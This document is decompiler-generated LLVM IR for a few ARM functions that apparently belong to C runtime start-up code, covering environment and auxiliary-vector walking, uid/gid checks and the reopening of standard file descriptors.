define i32 @function_11dd8(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_11dd8:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v2_11ddc = icmp eq i32 %arg2, 0
  br i1 %v2_11ddc, label %.thread1, label %bb

bb:                                               ; preds = %dec_label_pc_11dd8
  %v2_11de8 = add i32 %tmp, 4
  %v3_11de8 = inttoptr i32 %v2_11de8 to i32*
  %v4_11de8 = load i32, i32* %v3_11de8, align 4
  store i32 %v4_11de8, i32* %r0.global-to-local, align 4
  %v3_11dec = load i32, i32* %arg1, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_11dd8, %bb
  %.02 = phi i32 [ %v3_11dec, %bb ], [ undef, %dec_label_pc_11dd8 ]
  %v2_11df4 = xor i1 %v2_11ddc, true
  call void @__pseudo_cond_branch(i1 %v2_11df4, i32 %.02)
  %v1_11e00 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_11e00

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 1, 2, 0 }
  uselistorder i32 undef, { 1, 2, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @function_11e04() local_unnamed_addr {
dec_label_pc_11e28.lr.ph:
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_11e04 = load i32, i32* @r4, align 4
  store i32 %v3_11e04, i32* %stack_var_-16, align 4
  store i32 142036, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_11e28

dec_label_pc_11e28:                               ; preds = %dec_label_pc_11e28.dec_label_pc_11e28_crit_edge, %dec_label_pc_11e28.lr.ph
  %v1_11e28 = phi i32 [ %v1_11e34, %dec_label_pc_11e28.dec_label_pc_11e28_crit_edge ], [ 0, %dec_label_pc_11e28.lr.ph ]
  %v0_11e28 = phi i32 [ %v0_11e28.pre, %dec_label_pc_11e28.dec_label_pc_11e28_crit_edge ], [ 142036, %dec_label_pc_11e28.lr.ph ]
  %v4_11e28 = mul i32 %v1_11e28, 4
  %v5_11e28 = add i32 %v4_11e28, %v0_11e28
  %v6_11e28 = inttoptr i32 %v5_11e28 to i32*
  %v7_11e28 = load i32, i32* %v6_11e28, align 4
  call void @__pseudo_branch(i32 %v7_11e28)
  %v0_11e34 = load i32, i32* %r4.global-to-local, align 4
  %v1_11e34 = add i32 %v0_11e34, -1
  store i32 %v1_11e34, i32* %r4.global-to-local, align 4
  %v2_11e34 = icmp eq i32 %v0_11e34, 0
  br i1 %v2_11e34, label %dec_label_pc_11e3c, label %dec_label_pc_11e28.dec_label_pc_11e28_crit_edge

dec_label_pc_11e28.dec_label_pc_11e28_crit_edge:  ; preds = %dec_label_pc_11e28
  %v0_11e28.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_11e28

dec_label_pc_11e3c:                               ; preds = %dec_label_pc_11e28
  %v4_11e40 = load i32, i32* @global_var_254cc.517, align 4
  %v2_11e44 = icmp eq i32 %v4_11e40, 0
  br i1 %v2_11e44, label %bb16, label %bb

bb:                                               ; preds = %dec_label_pc_11e3c
  br label %bb16

bb16:                                             ; preds = %dec_label_pc_11e3c, %bb
  %v2_11e4c = xor i1 %v2_11e44, true
  call void @__pseudo_cond_branch(i1 %v2_11e4c, i32 %v4_11e40)
  %v4_11e54 = load i32, i32* @global_var_254d0.519, align 4
  %v2_11e58 = icmp eq i32 %v4_11e54, 0
  br i1 %v2_11e58, label %bb18, label %bb17

bb17:                                             ; preds = %bb16
  br label %bb18

bb18:                                             ; preds = %bb16, %bb17
  %v2_11e60 = xor i1 %v2_11e58, true
  call void @__pseudo_cond_branch(i1 %v2_11e60, i32 %v4_11e54)
  %v2_11e64 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_11e64, i32* %r4.global-to-local, align 4
  %v1_11e68 = load i32, i32* @r0, align 4
  ret i32 %v1_11e68

; uselistorder directives
  uselistorder i32 %v1_11e34, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 3, 2, 0 }
  uselistorder label %bb18, { 1, 0 }
  uselistorder label %bb16, { 1, 0 }
}

define i32 @function_11e80(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_11e80:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %v2_11e94 = call i32 @function_125d4(i32 %arg1, i32 1)
  %v3_11e9c = icmp eq i32 %v2_11e94, -1
  store i32 142044, i32* @r3, align 4
  br i1 %v3_11e9c, label %dec_label_pc_11ea8, label %dec_label_pc_11ec0

dec_label_pc_11ea8:                               ; preds = %dec_label_pc_11e80
  %v0_11eac = load i32, i32* %r5.global-to-local, align 4
  %v3_11eb4 = call i32 @function_123fc(i32 ptrtoint ([10 x i8]* @global_var_1a398.522 to i32), i32 %v0_11eac)
  %v1_11eb8 = load i32, i32* %r4.global-to-local, align 4
  %v1_11ebc = icmp ne i32 %v3_11eb4, %v1_11eb8
  call void @__pseudo_cond_branch(i1 %v1_11ebc, i32 ptrtoint (i32* @global_var_10b60.523 to i32))
  br label %dec_label_pc_11ec0

dec_label_pc_11ec0:                               ; preds = %dec_label_pc_11e80, %dec_label_pc_11ea8
  %v1_11ec8 = phi i32 [ %v2_11e94, %dec_label_pc_11e80 ], [ %v3_11eb4, %dec_label_pc_11ea8 ]
  ret i32 %v1_11ec8

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_11ec0, { 1, 0 }
}

define i32 @function_11ed4(i32 %arg1) local_unnamed_addr {
dec_label_pc_11ed4:
  %r4.global-to-local = alloca i32, align 4
  store i32 142044, i32* %r4.global-to-local, align 4
  %v4_11ee4 = load i32, i32* inttoptr (i32 142140 to i32*), align 4
  %v1_11ee8 = inttoptr i32 %v4_11ee4 to i32*
  %v2_11ee8 = load i32, i32* %v1_11ee8, align 4
  %v2_11eec = icmp eq i32 %v2_11ee8, 0
  br i1 %v2_11eec, label %dec_label_pc_11ef4, label %dec_label_pc_11f28

dec_label_pc_11ef4:                               ; preds = %dec_label_pc_11ed4
  %v4_11ef8 = load i32, i32* inttoptr (i32 142100 to i32*), align 4
  %v2_11f00 = icmp eq i32 %v4_11ef8, 0
  store i32 4096, i32* %v1_11ee8, align 4
  br i1 %v2_11f00, label %bb4, label %bb

bb:                                               ; preds = %dec_label_pc_11ef4
  br label %bb4

bb4:                                              ; preds = %dec_label_pc_11ef4, %bb
  %v2_11f0c = xor i1 %v2_11f00, true
  call void @__pseudo_cond_branch(i1 %v2_11f0c, i32 %v4_11ef8)
  %v0_11f14 = load i32, i32* %r4.global-to-local, align 4
  %v2_11f1c = icmp eq i32 %v0_11f14, 86740
  br i1 %v2_11f1c, label %bb6, label %bb5

bb5:                                              ; preds = %bb4
  br label %bb6

bb6:                                              ; preds = %bb4, %bb5
  %v2_11f24 = xor i1 %v2_11f1c, true
  call void @__pseudo_cond_branch(i1 %v2_11f24, i32 ptrtoint (i32* @global_var_d808.528 to i32))
  br label %dec_label_pc_11f28

dec_label_pc_11f28:                               ; preds = %dec_label_pc_11ed4, %bb6
  %v1_11f2c = load i32, i32* @r0, align 4
  ret i32 %v1_11f2c

; uselistorder directives
  uselistorder i1 %v2_11f1c, { 1, 0 }
  uselistorder label %dec_label_pc_11f28, { 1, 0 }
  uselistorder label %bb6, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @function_11f40(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_11f40:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  %tmp = ptrtoint i32* %arg3 to i32
  store i32 %tmp, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp49 = call i32 @__decompiler_undefined_function_0()
  %tmp50 = call i32 @__decompiler_undefined_function_0()
  %tmp51 = call i32 @__decompiler_undefined_function_0()
  %tmp52 = call i32 @__decompiler_undefined_function_0()
  %tmp53 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-120 = alloca i32, align 4
  store i32 %tmp, i32* @r7, align 4
  %v1_11f48 = add i32 %tmp, 4
  store i32 %v1_11f48, i32* %ip.global-to-local, align 4
  %v2_11f4c = load i32, i32* %arg3, align 4
  store i32 20, i32* %r2.global-to-local, align 4
  store i32 142044, i32* @r6, align 4
  %v3_11f58 = mul i32 %arg2, 4
  store i32 %v3_11f58, i32* %r5.global-to-local, align 4
  store i32 %arg2, i32* %sb.global-to-local, align 4
  %v4_11f60 = load i32, i32* inttoptr (i32 142064 to i32*), align 16
  store i32 28, i32* %r2.global-to-local, align 4
  %v2_11f68 = ptrtoint i32* %stack_var_-120 to i32
  %v4_11f6c = load i32, i32* inttoptr (i32 142072 to i32*), align 8
  store i32 %v4_11f6c, i32* %r4.global-to-local, align 4
  %v2_11f74 = add i32 %v1_11f48, %v3_11f58
  store i32 %v2_11f74, i32* %ip.global-to-local, align 4
  %v9_11f78 = icmp eq i32 %v2_11f74, %v2_11f4c
  store i1 %v9_11f78, i1* %cpsr_z.global-to-local, align 1
  %v2_11f7c = inttoptr i32 %v4_11f60 to i32*
  store i32 %arg7, i32* %v2_11f7c, align 4
  store i32 10740, i32* %r2.global-to-local, align 4
  %v0_11f88 = load i32, i32* %r3.global-to-local, align 4
  br i1 %v9_11f78, label %bb, label %.critedge

bb:                                               ; preds = %dec_label_pc_11f40
  %v1_11f8c = load i32, i32* @r7, align 4
  %v2_11f8c = load i32, i32* %r5.global-to-local, align 4
  %v3_11f8c = add i32 %v2_11f8c, %v1_11f8c
  store i32 %v3_11f8c, i32* %r3.global-to-local, align 4
  store i32 %arg6, i32* @global_var_254d0.519, align 4
  %v0_11f94 = load i32, i32* %ip.global-to-local, align 4
  %v1_11f94 = load i32, i32* %r4.global-to-local, align 4
  %v2_11f94 = inttoptr i32 %v1_11f94 to i32*
  store i32 %v0_11f94, i32* %v2_11f94, align 4
  store i32 120, i32* @r2, align 4
  %v1_11fa0 = load i32, i32* %r3.global-to-local, align 4
  %v2_11fa0 = load i32, i32* %r4.global-to-local, align 4
  %v3_11fa0 = inttoptr i32 %v2_11fa0 to i32*
  store i32 %v1_11fa0, i32* %v3_11fa0, align 4
  br label %bb57

.critedge:                                        ; preds = %dec_label_pc_11f40
  store i32 %arg6, i32* @global_var_254d0.519, align 4
  %v0_11f94.c = load i32, i32* %ip.global-to-local, align 4
  %v1_11f94.c = load i32, i32* %r4.global-to-local, align 4
  %v2_11f94.c = inttoptr i32 %v1_11f94.c to i32*
  store i32 %v0_11f94.c, i32* %v2_11f94.c, align 4
  store i32 120, i32* @r2, align 4
  br label %bb57

bb57:                                             ; preds = %.critedge, %bb
  store i32 %v2_11f68, i32* %r0.global-to-local, align 4
  %v2_11fac = bitcast i32* %stack_var_-120 to i8*
  %v3_11fac = call i32 @function_f240(i8* %v2_11fac, i32 0)
  store i32 %v3_11fac, i32* %r0.global-to-local, align 4
  %v0_11fb0 = load i32, i32* %r4.global-to-local, align 4
  %v1_11fb0 = inttoptr i32 %v0_11fb0 to i32*
  %storemerge.pre = load i32, i32* %v1_11fb0, align 4
  br label %dec_label_pc_11fbc

dec_label_pc_11fbc:                               ; preds = %dec_label_pc_11fbc, %bb57
  %storemerge = phi i32 [ %storemerge.pre, %bb57 ], [ %v4_11fbc, %dec_label_pc_11fbc ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v1_11fbc = inttoptr i32 %storemerge to i32*
  %v2_11fbc = load i32, i32* %v1_11fbc, align 4
  store i32 %v2_11fbc, i32* %r3.global-to-local, align 4
  %v4_11fbc = add i32 %storemerge, 4
  store i32 %v4_11fbc, i32* %r2.global-to-local, align 4
  %v2_11fc0 = icmp eq i32 %v2_11fbc, 0
  br i1 %v2_11fc0, label %dec_label_pc_11fcc, label %dec_label_pc_11fbc

dec_label_pc_11fcc:                               ; preds = %dec_label_pc_11fbc
  store i32 %v4_11fbc, i32* @r4, align 4
  store i32 %v2_11f68, i32* @r5, align 4
  %v1_11ff029 = inttoptr i32 %v4_11fbc to i32*
  %v2_11ff030 = load i32, i32* %v1_11ff029, align 4
  store i32 %v2_11ff030, i32* %r3.global-to-local, align 4
  %v2_11ff432 = icmp eq i32 %v2_11ff030, 0
  store i1 %v2_11ff432, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11ff432, label %dec_label_pc_11ffc, label %dec_label_pc_11fd8

dec_label_pc_11fd8:                               ; preds = %dec_label_pc_11fcc, %dec_label_pc_11ff0
  %v5_11fdc = phi i32 [ %v2_11ff0, %dec_label_pc_11ff0 ], [ %v2_11ff030, %dec_label_pc_11fcc ]
  %v2_11fd8 = icmp ugt i32 %v5_11fdc, 13
  %v7_11fd8 = icmp eq i32 %v5_11fdc, 14
  store i1 %v7_11fd8, i1* %cpsr_z.global-to-local, align 1
  %v2_11fdc = xor i1 %v2_11fd8, true
  %v3_11fdc = or i1 %v7_11fd8, %v2_11fdc
  br i1 %v3_11fdc, label %bb58, label %bb59

bb58:                                             ; preds = %dec_label_pc_11fd8
  %v4_11fdc = load i32, i32* @r5, align 4
  %v6_11fdc = and i32 %v5_11fdc, 536870912
  %v7_11fdc = icmp ne i32 %v6_11fdc, 0
  %v8_11fdc = mul i32 %v5_11fdc, 8
  %v9_11fdc = add i32 %v4_11fdc, %v8_11fdc
  store i32 %v9_11fdc, i32* %r0.global-to-local, align 4
  br label %bb59

bb59:                                             ; preds = %dec_label_pc_11fd8, %bb58
  %v1_11fe8 = phi i1 [ %v2_11fd8, %dec_label_pc_11fd8 ], [ %v7_11fdc, %bb58 ]
  %v2_11fe0 = xor i1 %v1_11fe8, true
  %v3_11fe0 = or i1 %v7_11fd8, %v2_11fe0
  br i1 %v3_11fe0, label %bb60, label %dec_label_pc_11ff0

bb60:                                             ; preds = %bb59
  store i32 8, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_11ff0

dec_label_pc_11ff0:                               ; preds = %bb59, %bb60
  call void @__pseudo_cond_branch(i1 %v3_11fe0, i32 ptrtoint (i32* @global_var_f350.391 to i32))
  %v0_11fec = load i32, i32* @r4, align 4
  %v1_11fec = add i32 %v0_11fec, 8
  store i32 %v1_11fec, i32* @r4, align 4
  %v1_11ff0 = inttoptr i32 %v1_11fec to i32*
  %v2_11ff0 = load i32, i32* %v1_11ff0, align 4
  store i32 %v2_11ff0, i32* %r3.global-to-local, align 4
  %v2_11ff4 = icmp eq i32 %v2_11ff0, 0
  store i1 %v2_11ff4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11ff4, label %dec_label_pc_11ffc, label %dec_label_pc_11fd8

dec_label_pc_11ffc:                               ; preds = %dec_label_pc_11ff0, %dec_label_pc_11fcc
  store i32 %v2_11f68, i32* %r0.global-to-local, align 4
  %v1_12000 = call i32 @function_152c8(i32 %v2_11f68)
  store i32 %v1_12000, i32* @r0, align 4
  %v1_12004 = call i32 @function_11ed4(i32 %v1_12000)
  store i32 %v1_12004, i32* @r0, align 4
  store i32 96, i32* %r3.global-to-local, align 4
  store i32 %tmp53, i32* @r2, align 4
  %v0_12010 = load i32, i32* @r6, align 4
  %v2_12010 = add i32 %v0_12010, 96
  %v3_12010 = inttoptr i32 %v2_12010 to i32*
  %v4_12010 = load i32, i32* %v3_12010, align 4
  store i32 %tmp52, i32* @r3, align 4
  %v2_12018 = icmp eq i32 %tmp53, 0
  store i1 %v2_12018, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_12018, label %bb61, label %bb62

bb61:                                             ; preds = %dec_label_pc_11ffc
  store i32 4096, i32* @r2, align 4
  br label %bb62

bb62:                                             ; preds = %dec_label_pc_11ffc, %bb61
  %v0_12024 = phi i32 [ %tmp53, %dec_label_pc_11ffc ], [ 4096, %bb61 ]
  %v3_12020 = icmp eq i32 %tmp52, -1
  %v8_12020 = icmp eq i32 %tmp52, -1
  store i1 %v8_12020, i1* %cpsr_z.global-to-local, align 1
  %v2_12024 = inttoptr i32 %v4_12010 to i32*
  store i32 %v0_12024, i32* %v2_12024, align 4
  br i1 %v3_12020, label %dec_label_pc_1202c, label %dec_label_pc_12054

dec_label_pc_1202c:                               ; preds = %bb62
  %v0_1202c = call i32 @function_124b8()
  store i32 %v0_1202c, i32* @r0, align 4
  store i32 %v0_1202c, i32* @r4, align 4
  %v0_12034 = call i32 @function_12514()
  store i32 %v0_12034, i32* @r0, align 4
  %v0_12038 = load i32, i32* @r4, align 4
  %v9_12038 = icmp eq i32 %v0_12038, %v0_12034
  store i1 %v9_12038, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_12038, label %dec_label_pc_12040, label %dec_label_pc_1207c

dec_label_pc_12040:                               ; preds = %dec_label_pc_1202c
  %v1_12040 = call i32 @function_12594(i32 %v0_12034)
  store i32 %v1_12040, i32* @r0, align 4
  store i32 %v1_12040, i32* @r4, align 4
  %v0_12048 = call i32 @function_12500()
  store i32 %v0_12048, i32* @r0, align 4
  %v0_1204c = load i32, i32* @r4, align 4
  %v9_1204c = icmp eq i32 %v0_1204c, %v0_12048
  store i1 %v9_1204c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_1204c, label %dec_label_pc_12054, label %dec_label_pc_1207c

dec_label_pc_12054:                               ; preds = %dec_label_pc_12040, %bb62
  store i32 %tmp52, i32* @r2, align 4
  store i1 %v8_12020, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_12020, label %dec_label_pc_120a0, label %dec_label_pc_12060

dec_label_pc_12060:                               ; preds = %dec_label_pc_12054
  store i32 %tmp51, i32* @r3, align 4
  %v9_12064 = icmp eq i32 %tmp52, %tmp51
  store i1 %v9_12064, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_12064, label %dec_label_pc_1206c, label %dec_label_pc_1207c

dec_label_pc_1206c:                               ; preds = %dec_label_pc_12060
  store i32 %tmp50, i32* @r2, align 4
  store i32 %tmp49, i32* @r3, align 4
  %v9_12074 = icmp eq i32 %tmp50, %tmp49
  store i1 %v9_12074, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_12074, label %dec_label_pc_120a0, label %dec_label_pc_1207c

dec_label_pc_1207c:                               ; preds = %dec_label_pc_12060, %dec_label_pc_12040, %dec_label_pc_1202c, %dec_label_pc_1206c
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_12084 = call i32 @function_11e80(i32 0, i32 32768)
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_12090 = call i32 @function_11e80(i32 1, i32 32770)
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_1209c = call i32 @function_11e80(i32 2, i32 32770)
  store i32 %v2_1209c, i32* @r0, align 4
  br label %dec_label_pc_120a0

dec_label_pc_120a0:                               ; preds = %dec_label_pc_1206c, %dec_label_pc_12054, %dec_label_pc_1207c
  %v0_120a0 = load i32, i32* @r7, align 4
  %v1_120a0 = inttoptr i32 %v0_120a0 to i32*
  %v2_120a0 = load i32, i32* %v1_120a0, align 4
  store i32 %v2_120a0, i32* %r2.global-to-local, align 4
  store i32 904, i32* %r3.global-to-local, align 4
  %v1_120a8 = load i32, i32* @r6, align 4
  %v3_120a8 = add i32 %v1_120a8, 904
  %v4_120a8 = inttoptr i32 %v3_120a8 to i32*
  store i32 %v2_120a0, i32* %v4_120a8, align 4
  %v0_120ac = load i32, i32* @r7, align 4
  %v1_120ac = inttoptr i32 %v0_120ac to i32*
  %v2_120ac = load i32, i32* %v1_120ac, align 4
  store i32 %v2_120ac, i32* @r4, align 4
  %v2_120b0 = icmp eq i32 %v2_120ac, 0
  store i1 %v2_120b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_120b0, label %dec_label_pc_12154.lr.ph, label %dec_label_pc_120b8

dec_label_pc_120b8:                               ; preds = %dec_label_pc_120a0
  store i32 116, i32* %r3.global-to-local, align 4
  %v0_120bc = load i32, i32* @r6, align 4
  %v2_120bc = add i32 %v0_120bc, 116
  %v3_120bc = inttoptr i32 %v2_120bc to i32*
  %v4_120bc = load i32, i32* %v3_120bc, align 4
  store i32 %v4_120bc, i32* %r3.global-to-local, align 4
  %v2_120c0 = inttoptr i32 %v4_120bc to i32*
  store i32 %v2_120ac, i32* %v2_120c0, align 4
  %v0_120c8 = load i32, i32* @r7, align 4
  %v1_120c8 = inttoptr i32 %v0_120c8 to i32*
  %v2_120c8 = load i32, i32* %v1_120c8, align 4
  store i32 %v2_120c8, i32* %r0.global-to-local, align 4
  %v4_120cc = call i32 @function_147b8(i32 %v2_120c8, i32 47, i32 %v2_120a0, i32 %v4_120bc)
  store i32 %v4_120cc, i32* @r0, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v2_120d4 = icmp eq i32 %v4_120cc, 0
  store i1 %v2_120d4, i1* %cpsr_z.global-to-local, align 1
  %v0_120d8 = load i32, i32* @r6, align 4
  %v2_120d8 = add i32 %v0_120d8, 64
  %v3_120d8 = inttoptr i32 %v2_120d8 to i32*
  %v4_120d8 = load i32, i32* %v3_120d8, align 4
  store i32 %v4_120d8, i32* %r2.global-to-local, align 4
  br i1 %v2_120d4, label %.thread46, label %bb63

.thread46:                                        ; preds = %dec_label_pc_120b8
  %v2_120e047 = inttoptr i32 %v4_120d8 to i32*
  store i32 0, i32* %v2_120e047, align 4
  br label %dec_label_pc_12154.lr.ph

bb63:                                             ; preds = %dec_label_pc_120b8
  %v2_120dc = add i32 %v4_120cc, 1
  store i32 %v2_120dc, i32* %r3.global-to-local, align 4
  %v2_120e0 = inttoptr i32 %v4_120d8 to i32*
  store i32 %v4_120cc, i32* %v2_120e0, align 4
  %v1_120e4 = load i32, i32* %r3.global-to-local, align 4
  %v2_120e4 = load i32, i32* %r2.global-to-local, align 4
  %v3_120e4 = inttoptr i32 %v2_120e4 to i32*
  store i32 %v1_120e4, i32* %v3_120e4, align 4
  br label %dec_label_pc_12154.lr.ph

dec_label_pc_12154.lr.ph:                         ; preds = %.thread46, %bb63, %dec_label_pc_120a0
  store i32 0, i32* %r5.global-to-local, align 4
  %v0_120fc = load i32, i32* @r6, align 4
  %v2_120fc = add i32 %v0_120fc, -12
  store i32 %v2_120fc, i32* %r8.global-to-local, align 4
  store i32 10736, i32* %r3.global-to-local, align 4
  store i32 %arg5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 %arg5, i32* @global_var_254cc.517, align 4
  %v2_1212c = icmp eq i32 %v0_11f88, 0
  store i1 %v2_1212c, i1* %cpsr_z.global-to-local, align 1
  %v2_12134 = xor i1 %v2_1212c, true
  call void @__pseudo_cond_branch(i1 %v2_12134, i32 %v0_11f88)
  store i32 -12, i32* %r2.global-to-local, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r5.global-to-local, align 4
  %v0_12148 = load i32, i32* @r6, align 4
  %v2_12148 = add i32 %v0_12148, -12
  store i32 %v2_12148, i32* %r8.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_12154

dec_label_pc_12154:                               ; preds = %dec_label_pc_12154.dec_label_pc_12154_crit_edge, %dec_label_pc_12154.lr.ph
  %v1_12154 = phi i32 [ %v1_12160, %dec_label_pc_12154.dec_label_pc_12154_crit_edge ], [ 0, %dec_label_pc_12154.lr.ph ]
  %v0_12154 = phi i32 [ %v0_12154.pre, %dec_label_pc_12154.dec_label_pc_12154_crit_edge ], [ %v2_12148, %dec_label_pc_12154.lr.ph ]
  %v4_12154 = mul i32 %v1_12154, 4
  %v5_12154 = add i32 %v4_12154, %v0_12154
  %v6_12154 = inttoptr i32 %v5_12154 to i32*
  %v7_12154 = load i32, i32* %v6_12154, align 4
  store i32 %v7_12154, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v7_12154)
  %v0_12160 = load i32, i32* %r4.global-to-local, align 4
  %v1_12160 = add i32 %v0_12160, 1
  store i32 %v1_12160, i32* %r4.global-to-local, align 4
  %v1_12164 = load i32, i32* %r5.global-to-local, align 4
  %v3_12164 = icmp ult i32 %v1_12160, %v1_12164
  %v9_12164 = icmp eq i32 %v1_12160, %v1_12164
  store i1 %v9_12164, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_12164, label %dec_label_pc_12154.dec_label_pc_12154_crit_edge, label %dec_label_pc_1216c

dec_label_pc_12154.dec_label_pc_12154_crit_edge:  ; preds = %dec_label_pc_12154
  %v0_12154.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_12154

dec_label_pc_1216c:                               ; preds = %dec_label_pc_12154
  %v0_12170.pre = load i32, i32* @r6, align 4
  store i32 108, i32* %r3.global-to-local, align 4
  %v2_12170 = add i32 %v0_12170.pre, 108
  %v3_12170 = inttoptr i32 %v2_12170 to i32*
  %v4_12170 = load i32, i32* %v3_12170, align 4
  store i32 %v4_12170, i32* %r2.global-to-local, align 4
  store i32 %v4_12170, i32* %r3.global-to-local, align 4
  %v2_12178 = icmp eq i32 %v4_12170, 0
  store i1 %v2_12178, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_12178, label %dec_label_pc_12190, label %dec_label_pc_12180

dec_label_pc_12180:                               ; preds = %dec_label_pc_1216c
  call void @__pseudo_branch(i32 %v4_12170)
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_1218c = load i32, i32* @r0, align 4
  %v2_1218c = inttoptr i32 %v1_1218c to i32*
  store i32 0, i32* %v2_1218c, align 4
  %v0_12194.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_12190

dec_label_pc_12190:                               ; preds = %dec_label_pc_1216c, %dec_label_pc_12180
  %v0_12194 = phi i32 [ %v0_12170.pre, %dec_label_pc_1216c ], [ %v0_12194.pre, %dec_label_pc_12180 ]
  store i32 84, i32* %r3.global-to-local, align 4
  %v2_12194 = add i32 %v0_12194, 84
  %v3_12194 = inttoptr i32 %v2_12194 to i32*
  %v4_12194 = load i32, i32* %v3_12194, align 4
  store i32 %v4_12194, i32* %r2.global-to-local, align 4
  store i32 %v4_12194, i32* %r3.global-to-local, align 4
  %v2_1219c = icmp eq i32 %v4_12194, 0
  store i1 %v2_1219c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1219c, label %dec_label_pc_121b4, label %dec_label_pc_121a4

dec_label_pc_121a4:                               ; preds = %dec_label_pc_12190
  call void @__pseudo_branch(i32 %v4_12194)
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_121b0 = load i32, i32* @r0, align 4
  %v2_121b0 = inttoptr i32 %v1_121b0 to i32*
  store i32 0, i32* %v2_121b0, align 4
  %v0_121b8.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_121b4

dec_label_pc_121b4:                               ; preds = %dec_label_pc_12190, %dec_label_pc_121a4
  %v0_121b8 = phi i32 [ %v0_12194, %dec_label_pc_12190 ], [ %v0_121b8.pre, %dec_label_pc_121a4 ]
  store i32 28, i32* %r3.global-to-local, align 4
  %v2_121b8 = add i32 %v0_121b8, 28
  %v3_121b8 = inttoptr i32 %v2_121b8 to i32*
  %v4_121b8 = load i32, i32* %v3_121b8, align 4
  store i32 %v4_121b8, i32* %r3.global-to-local, align 4
  %v1_121c0 = inttoptr i32 %v4_121b8 to i32*
  %v2_121c0 = load i32, i32* %v1_121c0, align 4
  store i32 %v2_121c0, i32* %r2.global-to-local, align 4
  %v0_121c4 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_121c4, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 %arg1)
  %v1_121d0 = call i32 @function_1148c(i32 %v0_121c4)
  store i32 %v1_121d0, i32* %r0.global-to-local, align 4
  %v0_121d4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_121d4, label %bb64, label %.thread8

bb64:                                             ; preds = %dec_label_pc_121b4
  %v1_121d4 = load i32, i32* @r1, align 4
  %v5_121d4 = mul i32 %v1_121d0, 8388608
  %v6_121d4 = and i32 %v1_121d4, %v5_121d4
  %v2_121d8 = load i32, i32* %r4.global-to-local, align 4
  %v9_121d8 = and i32 %v6_121d4, %v2_121d8
  %v2_121dc = load i32, i32* %ip.global-to-local, align 4
  %v9_121dc = and i32 %v9_121d8, %v2_121dc
  store i32 %v9_121dc, i32* %r0.global-to-local, align 4
  %v1_121e0 = load i32, i32* @r2, align 4
  %v4_121e0 = inttoptr i32 %v9_121dc to i32*
  store i32 %v1_121e0, i32* %v4_121e0, align 8388608
  %v5_121e0 = load i32, i32* %r4.global-to-local, align 4
  %v6_121e0 = load i32, i32* %r0.global-to-local, align 4
  %v7_121e0 = sub i32 %v6_121e0, %v5_121e0
  %v2_121e8 = load i32, i32* @r2, align 4
  %v3_121e8 = and i32 %v2_121e8, %v7_121e0
  store i32 %v3_121e8, i32* %r8.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_121b4, %bb64
  %v4_121f4 = phi i32 [ %v1_121d0, %dec_label_pc_121b4 ], [ 0, %bb64 ]
  ret i32 %v4_121f4

; uselistorder directives
